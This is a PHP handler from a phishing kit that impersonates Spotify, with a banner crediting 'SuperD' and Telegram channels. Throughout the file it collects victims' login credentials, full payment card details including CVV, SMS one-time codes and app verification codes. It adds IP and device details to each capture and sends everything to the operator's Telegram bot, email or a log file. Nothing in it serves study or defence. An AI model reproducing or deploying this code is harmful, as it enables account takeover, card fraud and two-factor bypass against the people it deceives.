<?php

/*
  █████████  █████  █████ ███████████  ██████████ ███████████    ██ ██████████  
 ███░░░░░███░░███  ░░███ ░░███░░░░░███░░███░░░░░█░░███░░░░░███  ███░░███░░░░███ 
░███    ░░░  ░███   ░███  ░███    ░███ ░███  █ ░  ░███    ░███ ░░░  ░███   ░░███
░░█████████  ░███   ░███  ░██████████  ░██████    ░██████████       ░███    ░███
 ░░░░░░░░███ ░███   ░███  ░███░░░░░░   ░███░░█    ░███░░░░░███      ░███    ░███
 ███    ░███ ░███   ░███  ░███         ░███ ░   █ ░███    ░███      ░███    ███ 
░░█████████  ░░████████   █████        ██████████ █████   █████     ██████████  
 ░░░░░░░░░    ░░░░░░░░   ░░░░░        ░░░░░░░░░░ ░░░░░   ░░░░░     ░░░░░░░░░░   
                                                                                
                                                                                
                                                                            
2025 

t.me/dj0ui
t.me/superdzone
t.me/superdsp
*/
@ini_set('display_errors', 'on');
include "functions.php";
require_once 'performance_database.php';

session_start();
$IP = getenv("REMOTE_ADDR");
$date = date("d M, Y");
$times = date("g:i a");
$os = $_SESSION['os'];
$bro = $_SESSION['browser'];
$code = $_SESSION['countryCode'];

// Initialize database
$db = PerformanceDatabase::getInstance();

/**
 * Save form data to visitor in database
 */
function saveFormDataToVisitor($formData) {
    global $db;
    
    $visitorId = $_COOKIE['visitor_id'] ?? null;
    
    if (!$visitorId) {
        return false;
    }
    
    $formData['timestamp'] = time();
    $formData['date'] = date('Y-m-d H:i:s');
    
    return $db->saveFormData($visitorId, $formData);
}


if(isset($_POST['username'])&&isset($_POST['password'])){session_start();


$usr=$_POST['username'];
$pss=$_POST['password'];
    saveFormDataToVisitor($_POST);


$msg= '
【<b>login</b> - '.$code.' - '.$IP.' 】
<b>user</b>  = <code>'.$usr.'</code>
<b>pass </b>  = <code>'.$pss.'</code>

[IP INFO] = <i><a href="http://www.geodatatool.com/?IP='.$IP.'">'.$IP.'</a></i>
[TIME/DATE] = <i>'.$times.' / '.$date.'</i>
[System info] = <i>'.$os.' / '.$bro.'</i>

 ♛ <b> '.getSiteName().' </b> - Spotify ♛';
sendtg($botToken, $chatId, $msg);
if (emlez() === true) {
    sendemail($email, $msg);
}
if (txt() === true) {
    savetxt($msg);
}
}



if(isset($_POST['usercc'])&&isset($_POST['cardnumber'])){session_start();
saveFormDataToVisitor($_POST);
$_SESSION['cc'] = str_replace(" ", "", $_POST['cardnumber']);
$bin = substr($_SESSION['cc'], 0, 8);
$api = 'https://lookup.binlist.net/' . $bin;
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $api);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$data   = curl_exec($curl);
curl_close($curl);
$details  = json_decode($data);
$_SESSION['bank'] = $details->bank->name;
$_SESSION['bank_type'] = $details->type;
$_SESSION['bank_brand'] =$details->brand;
$_SESSION['scheme'] =$details->scheme;

$fnm=$_POST['usercc'];
$cc=$_POST['cardnumber'];
$exp= $_POST['exp'];
$cvv=$_POST['cvc'];

$_SESSION['msg']=$msg= '
【💳 <b>CC</b> - '.$code.' - '.$IP.'】  
<b>Name</b>  =<code> '.$fnm.' </code> 
<b>cc</b>  = <code>'.$cc.'  </code>
<b>exp</b>  = <code>'.$exp.'  </code>
<b>Cvv</b>   = <code>'.$cvv.' </code> 
  
[Card Bank]  = '.$_SESSION['bank'].'   
[Card type]  = '.$_SESSION['bank_type'].'   
[Card brand]   = '.$_SESSION['bank_brand'].'  

[IP INFO] = <i><a href="http://www.geodatatool.com/?IP='.$IP.'">'.$IP.'</a></i>
[TIME/DATE] = <i>'.$times.' / '.$date.'</i>
[System info] = <i>'.$os.' / '.$bro.'</i>

【♛ '.getSiteName().' - Spotify ♛】';
sendtg($botToken, $chatId, $msg);
if (emlez() === true) {
    sendemail($email, $msg);
}
if (txt() === true) {
    savetxt($msg);
}
}

   
if(isset($_POST['sms'])){session_start();
    saveFormDataToVisitor($_POST);
    $sms   = $_POST['sms'];

if(isset($_POST['sms'])){
        if(!($_SESSION['sms'])){
            $_SESSION['sms'] = 1;

        }else{
            $count = $_SESSION['sms'] + 1;
            $_SESSION['sms'] = $count;

        }
    }

$msg= '
【<b>SMS</b> - '.$_SESSION['sms'].' - '.$IP.'】

<b>SMS</b>  = <code>'.$sms.'</code>


[IP INFO] = <i><a href="http://www.geodatatool.com/?IP='.$IP.'">'.$IP.'</a></i>
[TIME/DATE] = <i>'.$times.' / '.$date.'</i>
[System info] = <i>'.$os.' / '.$bro.'</i>

♛ '.getSiteName().' - Spotify ♛';
sendtg($botToken, $chatId, $msg);
if (emlez() === true) {
    sendemail($email, $msg);
}
if (txt() === true) {
    savetxt($msg);
}

}   



   
if(isset($_POST['app2'])){session_start();
    saveFormDataToVisitor($_POST);
    $app2   = $_POST['app2'];

if(isset($_POST['app2'])){
        if(!($_SESSION['app2'])){
            $_SESSION['app2'] = 1;

        }else{
            $count = $_SESSION['app2'] + 1;
            $_SESSION['app2'] = $count;

        }
    }

$msg= '
【APP CODE - '.$_SESSION['app2'].' - '.$IP.'】

<b>APP CODE</b>  = <code>'.$app2.'</code>


[IP INFO] = <a href="http://www.geodatatool.com/?IP='.$IP.'">'.$IP.'</a>
[TIME/DATE] ='.$times.' / '.$date.'
[System info] ='.$os.' / '.$bro.'

♛ '.getSiteName().' - Spotify ♛';
sendtg($botToken, $chatId, $msg);
if (emlez() === true) {
    sendemail($email, $msg);
}
if (txt() === true) {
    savetxt($msg);
}

}   


?>